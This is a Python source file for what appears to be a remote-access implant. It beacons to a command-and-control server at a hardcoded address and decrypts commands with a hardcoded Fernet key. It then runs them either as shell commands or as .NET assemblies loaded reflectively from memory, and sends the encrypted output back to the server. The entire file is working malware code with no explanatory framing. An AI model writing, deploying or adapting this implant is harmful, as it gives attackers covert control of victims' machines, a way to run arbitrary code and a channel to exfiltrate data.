import time
import json
import base64
import subprocess
import urllib.request
import urllib.error
from cryptography.fernet import Fernet

# .NET CLR Bridge
import clr
import System
from System.Reflection import Assembly

SHARED_KEY = b'rsO4pmoeWw12PE49hAlBh3uXBOBRJe5hcdIgiPblXUk='
cipher = Fernet(SHARED_KEY)

C2_URL = "http://172.16.138.1:5000"
SLEEP_INTERVAL = 2

def execute_dll_in_memory(dll_b64, target_method="Install", args=None):
    """Reflectively loads a C# assembly from RAM and dynamically invokes the requested target method."""
    if args is None:
        args = []
        
    if isinstance(target_method, list):
        target_method = target_method[0] if len(target_method) > 0 else "Install"
    elif not target_method:
        target_method = "Install"
        
    target_method_str = str(target_method).strip()

    try:
        raw_bytes = base64.b64decode(dll_b64)
        assembly = Assembly.Load(raw_bytes)

        # Search exported classes for target method
        for module_type in assembly.GetExportedTypes():
            for method_info in module_type.GetMethods():
                if method_info.Name.lower() == target_method_str.lower() and method_info.IsStatic:
                    csharp_args = System.Array[System.String](args) if args else System.Array[System.String]([])
                    
                    params = method_info.GetParameters()
                    if len(params) > 0:
                        result = method_info.Invoke(None, System.Array[System.Object]([csharp_args]))
                    else:
                        result = method_info.Invoke(None, None)

                    output_str = str(result) if result is not None else "[+] Execution finished (No return value)"
                    return f"[+] Reflected '{module_type.FullName}.{method_info.Name}()' Output:\n{output_str}"

        # Fallback search
        for module_type in assembly.GetExportedTypes():
            for method_info in module_type.GetMethods():
                if method_info.Name.lower() in ["install", "main", "execute", "run"] and method_info.IsStatic:
                    csharp_args = System.Array[System.String](args) if args else System.Array[System.String]([])
                    result = method_info.Invoke(None, System.Array[System.Object]([csharp_args]))
                    output_str = str(result) if result is not None else "[+] Execution finished"
                    return f"[+] Fallback Execution '{module_type.FullName}.{method_info.Name}()' Output:\n{output_str}"

        return f"[-] Error: Target method '{target_method_str}' not found in loaded assembly."

    except Exception as e:
        return f"[-] Reflection Exception: {str(e)}"

def check_in():
    try:
        req = urllib.request.Request(f"{C2_URL}/api/v1/ping")
        with urllib.request.urlopen(req) as response:
            encrypted_content = response.read()
            decrypted_command = cipher.decrypt(encrypted_content).decode()
            return decrypted_command
    except urllib.error.URLError:
        return None

def send_results(output_data):
    try:
        encrypted_output = cipher.encrypt(output_data.encode())
        req = urllib.request.Request(
            f"{C2_URL}/api/v1/results",
            data=encrypted_output,
            headers={'Content-Type': 'application/octet-stream'}
        )
        with urllib.request.urlopen(req) as response:
            pass
    except urllib.error.URLError:
        pass

def main():
    while True:
        command = check_in()
        
        if command:
            output = ""
            try:
                # Attempt to parse as an R2 JSON payload
                data = json.loads(command)
                if data.get("type") == "R2_EXEC":
                    print(f"[*] In-memory task received: {data['dll_name']}")
                    dll_b64 = data["dll_b64"]
                    target_method = data.get("target_method", "Install")
                    args = data.get("args", [])
                    
                    output = execute_dll_in_memory(dll_b64, target_method, args)
            except json.JSONDecodeError:
                # Fallback: Normal shell execution
                print(f"[*] Executing shell command: {command}")
                try:
                    result = subprocess.run(
                        command, 
                        shell=True, 
                        capture_output=True, 
                        text=True, 
                        timeout=10
                    )
                    output = result.stdout + result.stderr
                    if not output:
                        output = "[Command executed with no output]"
                except Exception as e:
                    output = f"Execution failed: {str(e)}"
            
            send_results(output)
            
        time.sleep(SLEEP_INTERVAL)

if __name__ == '__main__':
    main()